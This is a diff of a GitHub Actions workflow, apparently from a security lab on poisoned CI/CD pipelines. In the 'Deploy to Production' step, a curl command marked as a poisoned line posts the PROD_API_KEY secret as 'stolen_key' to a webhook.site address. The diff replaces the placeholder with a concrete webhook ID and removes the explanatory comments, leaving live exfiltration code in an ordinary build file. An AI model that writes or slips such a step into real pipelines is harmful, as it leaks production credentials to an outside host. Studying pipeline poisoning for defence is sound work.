@@ -6,23 +6,20 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Checkout Code
-        # This pulls your repository code onto the runner machine
         uses: actions/checkout@v3
 
       - name: Build Application
         run: |
           echo "Building the application..."
-          # In a real lab, you might run 'python app.py' here
           echo "Build successful!"
 
       - name: Deploy to Production
         env:
-          # This pulls the secret from your GitHub Settings
           MY_KEY: ${{ secrets.PROD_API_KEY }}
         run: |
           # --- POISONED LINE START ---
-          # This sends your private secret to the webhook URL
-          curl -X POST -d "stolen_key=$MY_KEY" https://webhook.site/YOUR-UNIQUE-ID
+          # Sending your secret to your specific Webhook.site URL
+          curl -X POST -d "stolen_key=$MY_KEY" https://webhook.site/adb39b4c-2e1a-4dcc-98ea-75588b78bf05
           # --- POISONED LINE END ---
           
           echo "Deploying to server..."
